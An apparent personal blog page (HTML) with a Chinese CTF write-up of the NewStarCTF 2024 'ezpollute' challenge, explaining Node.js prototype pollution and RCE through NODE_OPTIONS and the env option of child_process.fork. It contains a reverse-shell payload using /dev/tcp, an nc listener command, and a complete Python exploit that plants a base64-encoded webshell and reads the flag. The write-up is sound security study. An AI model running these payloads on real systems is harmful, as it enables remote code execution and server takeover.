@@ -1,0 +1,242 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>php伪协议 | tgrddf55's Blog</title><meta name="author" content="tgrddf55"><meta name="copyright" content="tgrddf55"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="题目链接newstarCTF 2024 ezpollute 原型链污染 https:&#x2F;&#x2F;wiki.wgpsec.org&#x2F;knowledge&#x2F;ctf&#x2F;js-prototype-chain-pollution.html   https:&#x2F;&#x2F;blog.mmf.moe&#x2F;post&#x2F;node-fork-proto-env-rce&#x2F;   https:&#x2F;&#x2F;quan9i.top&#x2F;post&#x2F;%E6%B5%85%E6%">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php伪协议">
+<meta property="og:url" content="http://example.com/2025/06/26/2025-06-26-nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/index.html">
+<meta property="og:site_name" content="tgrddf55&#39;s Blog">
+<meta property="og:description" content="题目链接newstarCTF 2024 ezpollute 原型链污染 https:&#x2F;&#x2F;wiki.wgpsec.org&#x2F;knowledge&#x2F;ctf&#x2F;js-prototype-chain-pollution.html   https:&#x2F;&#x2F;blog.mmf.moe&#x2F;post&#x2F;node-fork-proto-env-rce&#x2F;   https:&#x2F;&#x2F;quan9i.top&#x2F;post&#x2F;%E6%B5%85%E6%">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/56.jpg">
+<meta property="article:published_time" content="2025-06-25T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-06-25T16:00:00.000Z">
+<meta property="article:author" content="tgrddf55">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image/56.jpg"><link rel="shortcut icon" href="/imgs/tgrddf55.jpg"><link rel="canonical" href="http://example.com/2025/06/26/2025-06-26-nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'php伪协议',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-06-26 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/imgs/tgrddf55.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/image/56.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="tgrddf55's Blog"><span class="site-name">tgrddf55's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">php伪协议</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-06-25T16:00:00.000Z" title="发表于 2025-06-26 00:00:00">2025-06-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-25T16:00:00.000Z" title="更新于 2025-06-26 00:00:00">2025-06-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web/">web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="php伪协议"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h1><p><a target="_blank" rel="noopener" href="https://ctf.xidian.edu.cn/training/14?challenge=647">newstarCTF 2024 ezpollute</a></p>
+<h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/js-prototype-chain-pollution.html">https://wiki.wgpsec.org/knowledge/ctf/js-prototype-chain-pollution.html</a></p>
+</blockquote>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.mmf.moe/post/node-fork-proto-env-rce/">https://blog.mmf.moe/post/node-fork-proto-env-rce/</a></p>
+</blockquote>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://quan9i.top/post/%E6%B5%85%E6%9E%90CTF%E4%B8%AD%E7%9A%84Node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">https://quan9i.top/post/%E6%B5%85%E6%9E%90CTF%E4%B8%AD%E7%9A%84Node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a></p>
+</blockquote>
+<p>js中特有的，对象与对象间的继承是通过原型链实现的。</p>
+<p>在JavaScript中，每个对象都有一个原型，它是一个指向另一个对象的引用。当我们访问一个对象的属性时，如果该对象没有这个属性，JavaScript引擎会在它的原型对象中查找这个属性。这个过程会一直持续，直到找到该属性或者到达原型链的末尾。<br>攻击者可以利用这个特性，通过修改一个对象的原型链，来污染程序的行为。例如，攻击者可以在一个对象的原型链上设置一个恶意的属性或方法，当程序在后续的执行中访问该属性或方法时，就会执行攻击者的恶意代码。</p>
+<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080029821.jpeg" alt="原型链"></p>
+<p>关注一下<code>__proto__</code>和<code>prototype</code></p>
+<p>一开始看的时候总是喜欢把这两个搞混</p>
+<p>这里讲一下我的理解</p>
+<p>js里没有传统的类概念，这里的Cat.prototype和Object.prototype叫做原型，可以等价于类的概念。</p>
+<p>其中prototype是对于构造函数来说的，<code>__proto__</code>是对于一个已经实例化的对象来说的。</p>
+<p>其中<code>__proto__</code>是实例对象的一个属性，也就是说可以通过实例对象访问它的原型（类），假如说我们能够修改某一个对象的<code>__proto__</code>属性，那么我们也就可以改变它的原型（类），这样的话，所有之后从这个原型产生的实例对象都会有我们附加的属性。</p>
+<p>js中调用某个对象的属性时，过程是这样的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、在b对象中寻找number属性</span><br><span class="line">2、当在b对象中没有找到时，它会在b.__proto__中寻找number属性</span><br><span class="line">3、如果仍未找到，此时会去b.__proto__.__proto__中寻找number属性</span><br></pre></td></tr></table></figure>
+
+<h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>在&#x2F;config路由下有这样的代码</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">userConfig = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(jsonData)</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        finalConfig = <span class="title function_">clone</span>(defaultWaterMarkConfig)</span><br><span class="line">        <span class="title function_">merge</span>(finalConfig, userConfig)</span><br><span class="line">        fs.<span class="title function_">writeFileSync</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, userID, <span class="string">&#x27;config.json&#x27;</span>), <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(finalConfig))</span><br><span class="line">        ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">code</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&#x27;Config updated successfully&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">code</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&#x27;Some error occurred&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到有个merge函数</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_">isObject</span>(target) || !<span class="title function_">isObject</span>(source)) &#123;</span><br><span class="line">        <span class="keyword">return</span> target</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key === <span class="string">&quot;__proto__&quot;</span>) <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (source[key] === <span class="string">&quot;&quot;</span>) <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">isObject</span>(source[key]) &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            target[key] = <span class="title function_">merge</span>(target[key], source[key]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> target</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>merge函数把proto属性ban了，但是还能通过<code>constructor.prototype</code> 来绕过限制</p>
+<p>之后的&#x2F;process有这样的代码</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">const</span> proc = <span class="title function_">fork</span>(<span class="title class_">PhotoProcessScript</span>, [userDir], &#123; <span class="attr">silent</span>: <span class="literal">true</span> &#125;)</span><br><span class="line"></span><br><span class="line">            proc.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">(<span class="params">code</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (code === <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="title function_">resolve</span>(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;An error occurred during execution&#x27;</span>))</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line">            proc.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`Failed to start subprocess: <span class="subst">$&#123;err.message&#125;</span>`</span>))</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure>
+
+<p>其中有fork函数</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.mmf.moe/post/node-fork-proto-env-rce/">https://blog.mmf.moe/post/node-fork-proto-env-rce/</a></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在 Node.js 中，child_process.fork() 的第三个参数 options 通常包含一个 env 字段，用于设置子进程的环境变量。</span><br><span class="line"></span><br><span class="line">如果开发者没有显式传递 env，Node 会用默认值 process.env，而如果你通过原型链污染注入了 env，就会被“继承”进来。</span><br></pre></td></tr></table></figure>
+
+<p>我们现在能够修改env了，但是我们还希望能够将其作为代码执行</p>
+<p>除了env这个属性外，还有NODE_OPTIONS这个属性，这个属性控制了启动参数</p>
+<p> 比如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;NODE_OPTIONS&quot;: &quot;--require path/to/file.js&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>就是执行file.js文件中的代码</p>
+<p>我们既然可以控制环境变量，也就是说可以控制&#x2F;proc&#x2F;self&#x2F;environ这个文件，也就可以把这个文件中的内容当做代码执行，由此就可以实现任意代码执行</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;constructor&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;prototype&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;NODE_OPTIONS&quot;</span>: <span class="string">&quot;--require /proc/self/environ&quot;</span>,</span><br><span class="line">            <span class="string">&quot;env&quot;</span>: &#123;</span><br><span class="line">                 <span class="string">&quot;A&quot;</span>:<span class="string">&quot;require(\&quot;child_process\&quot;).execSync(\&quot;bash -c \&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&#x27;\&quot;)//&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>env这句代码的意思就是反弹shell</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c 的意思是：运行后面的字符串作为一个 shell 命令。</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>片段</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>bash -i</code></td>
+<td>启动一个交互式 bash shell</td>
+</tr>
+<tr>
+<td><code>&gt;</code></td>
+<td>输出重定向符号</td>
+</tr>
+<tr>
+<td><code>&amp;&gt;</code></td>
+<td><strong>同时重定向 stdout 和 stderr</strong></td>
+</tr>
+<tr>
+<td><code>/dev/tcp/ip/port</code></td>
+<td>是 bash 的一种特性，表示通过 TCP 连接到远程主机的某个端口（即建立 socket）</td>
+</tr>
+<tr>
+<td><code>0&gt;&amp;1</code></td>
+<td>将 <strong>标准输入</strong>（fd 0）重定向到标准输出（fd 1），这样远程主机的输入可以控制本机 shell</td>
+</tr>
+</tbody></table>
+<p>当前我是自己起的docker服务，因此可以进行反弹shell</p>
+<p>我们的思路是这样的，首先向服务器发送几张图片，然后接收到token，之后使用burpsuite向&#x2F;cinfig发包，正文加入我们的payload，成功之后，再向&#x2F;process发包，此时就可以触发我们的反弹shell（要先在公网服务器使用命令nc -lvnp 12345监听）</p>
+<p>不出网时的思路：写webshell覆盖index.js，然后读取flag</p>
+<p>wp里的脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://url:port&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 token</span></span><br><span class="line"><span class="comment"># 随便发送点图片获取 token</span></span><br><span class="line">files = [</span><br><span class="line">    (<span class="string">&#x27;images&#x27;</span>, (<span class="string">&#x27;anno.png&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;./1.png&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&#x27;image/png&#x27;</span>)),</span><br><span class="line">    (<span class="string">&#x27;images&#x27;</span>, (<span class="string">&#x27;soyo.png&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;./2.png&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&#x27;image/png&#x27;</span>))</span><br><span class="line">]</span><br><span class="line">res = requests.post(url + <span class="string">&quot;/upload&quot;</span>, files=files)</span><br><span class="line">token = res.headers.get(<span class="string">&#x27;Set-Cookie&#x27;</span>)</span><br><span class="line"><span class="keyword">match</span> = re.search(<span class="string">r&#x27;token=([a-f0-9\-\.]+)&#x27;</span>, token)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">    token = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] token: <span class="subst">&#123;token&#125;</span>&quot;</span>)</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">f&#x27;token=<span class="subst">&#123;token&#125;</span>&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过原型链污染 env 注入恶意代码即可 RCE</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入 WebShell</span></span><br><span class="line">webshell = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">const Koa = require(&#x27;koa&#x27;)</span></span><br><span class="line"><span class="string">const Router = require(&#x27;koa-router&#x27;)</span></span><br><span class="line"><span class="string">const app = new Koa()</span></span><br><span class="line"><span class="string">const router = new Router()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">router.get(&quot;/webshell&quot;, async (ctx) =&gt; &#123;</span></span><br><span class="line"><span class="string">    const &#123;cmd&#125; = ctx.query</span></span><br><span class="line"><span class="string">    res = require(&#x27;child_process&#x27;).execSync(cmd).toString()</span></span><br><span class="line"><span class="string">    return ctx.body = &#123;</span></span><br><span class="line"><span class="string">        res</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">app.use(router.routes())</span></span><br><span class="line"><span class="string">app.listen(3000, () =&gt; &#123;</span></span><br><span class="line"><span class="string">    console.log(&#x27;http://127.0.0.1:3000&#x27;)</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 WebShell 内容 Base64 编码</span></span><br><span class="line">encoded_webshell = base64.b64encode(webshell.encode()).decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Base64 解码后写入文件</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;constructor&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;prototype&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;NODE_OPTIONS&quot;</span>: <span class="string">&quot;--require /proc/self/environ&quot;</span>,</span><br><span class="line">            <span class="string">&quot;env&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;A&quot;</span>: <span class="string">f&quot;require(\&quot;child_process\&quot;).execSync(\&quot;echo <span class="subst">&#123;encoded_webshell&#125;</span> | base64 -d &gt; /app/index.js\&quot;)//&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 原型链污染</span></span><br><span class="line">requests.post(url + <span class="string">&quot;/config&quot;</span>, json=payload, headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发 fork 实现 RCE</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.post(url + <span class="string">&quot;/process&quot;</span>, headers=headers)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 访问有回显的 WebShell</span></span><br><span class="line">res = requests.get(url + <span class="string">&quot;/webshell?cmd=cat /flag&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">tgrddf55</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/06/26/2025-06-26-nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">http://example.com/2025/06/26/2025-06-26-nodejs原型链污染/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">tgrddf55's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a></div><div class="post_share"><div class="social-share" data-image="/image/56.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/06/27/2025-06-26-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/" title="php反序列化基础"><img class="cover" src="/image/52.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">php反序列化基础</div></div></a></div><div class="next-post pull-right"><a href="/2025/06/26/2025-06-26-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="php伪协议"><img class="cover" src="/image/17.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">php伪协议</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2025/05/30/2025-05-30-js%E5%85%A5%E9%97%A8/" title="js study"><img class="cover" src="/image/9.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-30</div><div class="title">js study</div></div></a></div><div><a href="/2025/05/31/2025-05-31-css%E5%85%A5%E9%97%A8/" title="css study"><img class="cover" src="/image/41.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-31</div><div class="title">css study</div></div></a></div><div><a href="/2025/06/07/2025-06-07-php%E5%85%A5%E9%97%A8/" title="php study"><img class="cover" src="/image/33.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-07</div><div class="title">php study</div></div></a></div><div><a href="/2025/05/30/2025-05-30-html%E5%85%A5%E9%97%A8/" title="html study"><img class="cover" src="/image/45.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-30</div><div class="title">html study</div></div></a></div><div><a href="/2025/06/02/2025-06-02-web%E5%85%A5%E9%97%A8%E9%A2%98%E5%8D%95/" title="web入门题单"><img class="cover" src="/image/48.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-02</div><div class="title">web入门题单</div></div></a></div><div><a href="/2025/06/09/2025-06-09-sql%E5%85%A5%E9%97%A8/" title="sql study"><img class="cover" src="/image/36.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-09</div><div class="title">sql study</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/imgs/tgrddf55.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">tgrddf55</div><div class="author-info__description">几时归去，做个闲人</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="card-info-social-icons is-center"><a 